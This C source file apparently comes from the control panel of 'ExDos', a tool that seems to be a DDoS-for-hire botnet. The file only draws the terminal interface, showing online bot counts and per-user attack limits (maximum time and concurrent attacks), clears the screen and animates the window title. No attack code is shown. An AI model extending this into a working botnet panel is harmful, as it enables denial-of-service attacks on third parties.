#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "commands.h"

/*
*
*   [ GLOBAL METHODS FOR COMMANDS ]
*
* - Set UI
* - ClearScreen
* - Title Updater
*/
void set_ui(ExDos *x, Client *c) {
    /* Set UI and Title */
    Write(((Client *)c)->sock, (str *)((Theme *)((ExDos *)x)->Theme)->Layout);
    place_text(((Client *)c)->sock, string("2"), string("24"), string("[ ExDos | Version 1.0.0 | Author: Algo1337 | Github: Algo1337 ]"));

    /* Place Statistics Information Text */
    str *user_count = string(int2ch((int)((ExDos *)x)->online_user_count));
    user_count->AppendString(user_count, "/");
    user_count->AppendString(user_count, int2ch((int)((ExDos *)x)->user_idx - 1));
    place_text(((Client *)c)->sock, string("6"), string(int2ch(user_count->idx > 1 ? 35 - (user_count->idx/2) : 35)), user_count);
    free(user_count);

    /* Place Account Information Text */
    place_text(((Client *)c)->sock, string("6"), string("55"), string(int2ch((int)((ExDos *)x)->online_bots->idx)));
    place_text(((Client *)c)->sock, string("6"), string("75"), string(int2ch((int)((ExDos *)x)->LogCount)));
    place_text(((Client *)c)->sock, string("14"), string("9"), ((Client *)c)->account->USERNAME);
    place_text(((Client *)c)->sock, string("15"), string("9"), string(int2ch(((Client *)c)->account->PLAN)));
    place_text(((Client *)c)->sock, string("16"), string("13"), string(int2ch(((Client *)c)->account->MAX_TIME)));
    place_text(((Client *)c)->sock, string("17"), string("13"), string(int2ch(((Client *)c)->account->MAX_CONCURRENTS)));
    place_text(((Client *)c)->sock, string("18"), string("8"), string(int2ch(((Client *)c)->account->VIP)));
    place_text(((Client *)c)->sock, string("19"), string("11"), ((Client *)c)->account->EXPIRY);
    place_text(((Client *)c)->sock, string("20"), string("9"), string(int2ch((int)((Client *)c)->account->RANK)));
}

void ClearScreen(Socket *client) {
    int row = 9;
    for(int i = 0; i < 17; i++) {
        place_text(
            client, 
            string(int2ch(row)), 
            string("21"), 
            string("                                                                      ")
        );
        row++;
    }
}

void *title_updater(void **args) {
    ExDos *c = (ExDos *)args[0];
    Client *client = (Client *)args[1];

    char *spinner_chars[] = {"\\", "|", "/", "-"};
    int spin = 0;
    str *title = string(NULL);
    while(1) {
        if(spin == 4)
            spin = 0;

        title = string("[");
        title->AppendString(title, spinner_chars[spin++]);
        title->AppendString(title, "] ExDos | Version: 1.0.0");
        ChangeTermTitle(client->sock, string(title->data));
        free(title);
        usleep(500000);
    }
}
